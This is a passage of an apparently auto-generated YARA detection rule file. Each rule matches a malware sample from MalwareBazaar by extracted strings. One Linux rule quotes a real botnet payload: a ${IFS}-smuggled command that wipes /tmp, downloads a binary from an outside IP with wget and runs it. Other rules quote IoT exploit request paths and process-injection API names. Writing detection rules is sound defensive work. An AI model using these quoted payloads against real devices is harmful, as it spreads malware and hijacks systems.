        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4653KB and
        all of them
}

rule Windows_c73bb19710439d291c7c21e3632ca7122fc85c14b0eecaaaeeda92daf5a833ae
{
    meta:
        description = "Auto ML: c73bb19710439d291c7c21e3632ca7122fc85c14b0eecaaaeeda92daf5a833ae"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = "System"
        $s4 = "kernel32.dll"
        $s5 = "GetLongPathNameA"
        $s6 = "Windows"
        $s7 = "TFileName"
        $s8 = "TFormatSettings"
        $s9 = "TThreadLocalCounter"
        $s10 = "$TMultiReadExclusiveWriteSynchronizer"
        $s11 = "GetDiskFreeSpaceExA"
        $s12 = "oleaut32.dll"
        $s13 = "VariantChangeTypeEx"
        $s14 = "EVariantArrayCreateError"
        $s15 = "IOleWindow"
        $s16 = "bdRightToLeftReadingOnly"
        $s17 = "EFileStreamError"
        $s18 = "EFCreateError"
        $s19 = "EFOpenErrord"
        $s20 = "EFilerError"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7357KB and
        all of them
}

rule Linux_c75281f91858e6e7ca1368754883588894de2a474bf7a32cc226af52d596277f
{
    meta:
        description = "Auto ML: c75281f91858e6e7ca1368754883588894de2a474bf7a32cc226af52d596277f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/proc/%s/cmdline"
        $s7 = "/bin/systemd"
        $s8 = "/var/Challenget"
        $s9 = "[killer] Failed to create child process."
        $s10 = "deleted"
        $s11 = "payloadasdf"
        $s12 = "GET /%s HTTP/1.0"
        $s13 = "User-Agent: Update v1.0"
        $s14 = "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;"
        $s15 = "No such file or directory"
        $s16 = "No such process"
        $s17 = "Interrupted system call"
        $s18 = "Bad file descriptor"
        $s19 = "No child processes"
        $s20 = "Resource temporarily unavailable"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB and
        all of them
}

rule Linux_c75d7af60a0f2562ba324a8f0222f1e29790f7784685b2bc9597d8dffbd7e101
{
    meta:
        description = "Auto ML: c75d7af60a0f2562ba324a8f0222f1e29790f7784685b2bc9597d8dffbd7e101"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 145KB and
        all of them
}

rule Windows_c7a55fa02d84ce165456e6edaaa1b1fc3c158a84defaa5ff2a669ac3153e5e29
{
    meta:
        description = "Auto ML: c7a55fa02d84ce165456e6edaaa1b1fc3c158a84defaa5ff2a669ac3153e5e29"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "MS Shell Dlg"
        $s6 = "CTempWnd"
        $s7 = "GetMonitorInfoA"
        $s8 = "MonitorFromWindow"
        $s9 = "GetSystemMetrics"
        $s10 = "USER32"
        $s11 = "COMCTL32.DLL"
        $s12 = "CCmdTarget"
        $s13 = "CFileException"
        $s14 = "CFile"
        $s15 = "CTempImageList"
        $s16 = "ToolbarWindow32"
        $s17 = "CTempGdiObject"
        $s18 = "CTempDC"
        $s19 = "CWindowDC"
        $s20 = "CUserException"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1107KB and
        all of them
}

rule Windows_c7c1f9e094890a135131fea3083df258c2d7c6375aab3061fdf0b1e5b9c3ba66
{
    meta:
        description = "Auto ML: c7c1f9e094890a135131fea3083df258c2d7c6375aab3061fdf0b1e5b9c3ba66"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 886KB and
        all of them
}

rule Windows_c7c312035f6694f1941a1fc437a68c9c3e1aabdae242d1e3fd557dda53bdfcb0
{
    meta:
        description = "Auto ML: c7c312035f6694f1941a1fc437a68c9c3e1aabdae242d1e3fd557dda53bdfcb0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1992KB and
        all of them
}

rule Windows_c7cc77635eee4026d68f94cecbd1b92793de6ff0d8506c74b9c3a4bfe0c19541
{
    meta:
        description = "Auto ML: c7cc77635eee4026d68f94cecbd1b92793de6ff0d8506c74b9c3a4bfe0c19541"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 257KB and
        all of them
}

rule Windows_c7ccb4a44b7cd5ddce78eec54a5e0c306bcd1a0154db447b0f3efbe4719ca4ba
{
    meta:
        description = "Auto ML: c7ccb4a44b7cd5ddce78eec54a5e0c306bcd1a0154db447b0f3efbe4719ca4ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB and
        all of them
}

rule Linux_01a3c32b8cbafa4cb8d818e8c97035df9b31e3f162e1a926271f44b009074c39
{
    meta:
        description = "Auto ML: 01a3c32b8cbafa4cb8d818e8c97035df9b31e3f162e1a926271f44b009074c39"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 127KB and
        all of them
}

rule Windows_1474f0ee2a0f2a806573cb3784d869de3d58d31d16c1fcdf2f4fc523336792e9
{
    meta:
        description = "Auto ML: 1474f0ee2a0f2a806573cb3784d869de3d58d31d16c1fcdf2f4fc523336792e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Cannot read Table of Contents."
        $s7 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s9 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s10 = "Failed to extract %s: failed to read data chunk!"
        $s11 = "fread"
        $s12 = "Failed to extract %s: failed to write data chunk!"
        $s13 = "fwrite"
        $s14 = "Failed to extract %s: failed to open archive file!"
        $s15 = "Failed to extract %s: failed to open target file!"
        $s16 = "fopen"
        $s17 = "Failed to read cookie!"
        $s18 = "Could not read full TOC!"
        $s19 = "Error on file."
        $s20 = "Failed to open archive %s!"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 36023KB and
        all of them
}

rule Windows_c8036552ee5aa9ce1c45475a550bb73c67a4b767befc158d4e5212aab67aaf94
{
    meta:
        description = "Auto ML: c8036552ee5aa9ce1c45475a550bb73c67a4b767befc158d4e5212aab67aaf94"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "CRYPT32.dll"
        $s19 = "SHLWAPI.dll"
        $s20 = "gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1839KB and
        all of them
}

rule Windows_c8412899f61e15fa2e4a88a289c7527758149f94693321bdf6673134795e7504
{
    meta:
        description = "Auto ML: c8412899f61e15fa2e4a88a289c7527758149f94693321bdf6673134795e7504"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_c85533dc3627cc14b81a22fb204c42c9e5527e15ad78c832da7a159825de6ec7
{
    meta:
        description = "Auto ML: c85533dc3627cc14b81a22fb204c42c9e5527e15ad78c832da7a159825de6ec7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = "kernel32H9"
        $s17 = ".dllu"
        $s18 = ">.exeu"
        $s19 = "thread"
        $s20 = "Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2261KB and
        all of them
}

rule Windows_c897c784626cb3d7748dc94bf3401205aa785efcef10a1e5534def1ab68a2f6f
{
    meta:
        description = "Auto ML: c897c784626cb3d7748dc94bf3401205aa785efcef10a1e5534def1ab68a2f6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "nhkey0vk.dll"
        $s6 = "System"
        $s7 = "PROCESS_VM_OPERATION"
        $s8 = "PROCESS_VM_READ"
        $s9 = "PROCESS_VM_WRITE"
        $s10 = "OpenProcess"
        $s11 = "WriteProcessMemory"
        $s12 = "CloseHandle"
        $s13 = "LoadLibrary"
        $s14 = "GetProcAddress"
        $s15 = "dwProcessId"
        $s16 = "hProcess"
        $s17 = "System.Runtime.InteropServices"
        $s18 = "lpFileName"
        $s19 = "hModule"
        $s20 = "System.Runtime.CompilerServices"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4KB and
        all of them
}

rule Windows_c8b92119a5b562bbcea0562512a45db5a9695166b8950617604ced871f604bc0
{
    meta:
        description = "Auto ML: c8b92119a5b562bbcea0562512a45db5a9695166b8950617604ced871f604bc0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "advapi32.dll"
        $s7 = "setupx.dll"
        $s8 = "setupapi.dll"
        $s9 = "advpack.dll"
        $s10 = "wininit.ini"
        $s11 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s12 = "HeapSetInformation"
        $s13 = "DecryptFileA"
        $s14 = "SHOWWINDOW"
        $s15 = "ADMQCMD"
        $s16 = "USRQCMD"
        $s17 = "LoadString() Error.  Could not load string resource."
        $s18 = "FILESIZES"
        $s19 = "UPDFILE%lu"
        $s20 = ".text$mn"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5322KB and
        all of them
}

rule Windows_c8f7cef323792b6b8bf74024704ad6add92b48d81c853b6cf41456bcc3519b10
{
    meta:
        description = "Auto ML: c8f7cef323792b6b8bf74024704ad6add92b48d81c853b6cf41456bcc3519b10"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "kernel32.dll"
        $s3 = "GetModuleHandleA"
        $s4 = "mscoree.dll"
        $s5 = "If you want to change the Windows User Account Control level replace the"
        $s6 = "requestedExecutionLevel node with one of the following."
        $s7 = "<requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s8 = "Specifying requestedExecutionLevel element will disable file and registry virtualization."
        $s9 = "<defaultAssemblyRequest permissionSetReference=\"Custom\" />"
        $s10 = "<PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" Unrestricted=\"true\" ID=\"Custom\" SameSite=\"site\" />"
        $s11 = "<!-- A list of the Windows versions that this application has been tested on"
        $s12 = "and Windows will automatically select the most compatible environment. -->"
        $s13 = "<!-- Windows Vista -->"
        $s14 = "<!-- Windows 7 -->"
        $s15 = "<!-- Windows 8 -->"
        $s16 = "<!-- Windows 8.1 -->"
        $s17 = "<!-- Windows 10 -->"
        $s18 = "<!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher"
        $s19 = "DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need"
        $s20 = "to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3394KB and
        all of them
}

rule Windows_c96ebdb12684d0b47ebd0fa81aee556c8c981b942262d2169d9f63dc3b7e5a7c
{
    meta:
        description = "Auto ML: c96ebdb12684d0b47ebd0fa81aee556c8c981b942262d2169d9f63dc3b7e5a7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GetProcessWindowStation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 803KB and
        all of them
}

rule Windows_c9b54d5f8b3a9b1da0c9765305c3487351a8ac8f2c8683284ea632910e92e132
{
    meta:
        description = "Auto ML: c9b54d5f8b3a9b1da0c9765305c3487351a8ac8f2c8683284ea632910e92e132"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 785KB and
        all of them
}

rule Windows_c9be1ff9d80d934774556669459ad3242500a745531ba25f7c874f32f318cdd1
{
    meta:
        description = "Auto ML: c9be1ff9d80d934774556669459ad3242500a745531ba25f7c874f32f318cdd1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1269KB and
        all of them
}

rule Windows_c9d75a27ed76fa8006bbfb067fca6f80506535a83914f7ae44e238c0f816c26d
{
    meta:
        description = "Auto ML: c9d75a27ed76fa8006bbfb067fca6f80506535a83914f7ae44e238c0f816c26d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Drawing.Drawing2D"
        $s6 = "GetLI"
        $s7 = "System.IO"
        $s8 = "get_kuLT"
        $s9 = "System.Collections.Generic"
        $s10 = "get_CanRead"
        $s11 = "buttonLoad"
        $s12 = "get_windSpeed"
        $s13 = "set_Enabled"
        $s14 = "set_FormattingEnabled"
        $s15 = "<windSpeed>k__BackingField"
        $s16 = "<temperature>k__BackingField"
        $s17 = "<windDirection>k__BackingField"
        $s18 = "set_AutoScaleMode"
        $s19 = "FileMode"
        $s20 = "set_SizeMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 649KB and
        all of them
}

rule Linux_149e50cf48fb35fab9ba319d734c4894a578e6a9d764cda6a63607dd41f656ef
{
    meta:
        description = "Auto ML: 149e50cf48fb35fab9ba319d734c4894a578e6a9d764cda6a63607dd41f656ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB and
        all of them
}

rule Windows_c9faa7c09b54f1aeecbe5c9dfe92506891188002f0f7574490a8c58f310ad0b3
{
    meta:
        description = "Auto ML: c9faa7c09b54f1aeecbe5c9dfe92506891188002f0f7574490a8c58f310ad0b3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "GetProcAddress"
        $s7 = "tcmd"
        $s8 = "4TgET"
        $s9 = "mGeTtY@"
        $s10 = "SEtE"
        $s11 = "wiNK"
        $s12 = "LoadLibraryA"
        $s13 = "GetProcessWindowStation"
        $s14 = "SetThreadAffinityMask"
        $s15 = "USER32.dll"
        $s16 = "GetModuleFileNameW"
        $s17 = "CreateProcessW"
        $s18 = "GetProcessAffinityMask"
        $s19 = "GetUserObjectInformationW"
        $s20 = "GetModuleHandleA"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 5634KB and
        all of them
}

rule Linux_c9fe7a1697c4be2afcf80c5ace26d7d3858403a7a3346110236f99ed1d80a7ec
{
    meta:
        description = "Auto ML: c9fe7a1697c4be2afcf80c5ace26d7d3858403a7a3346110236f99ed1d80a7ec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
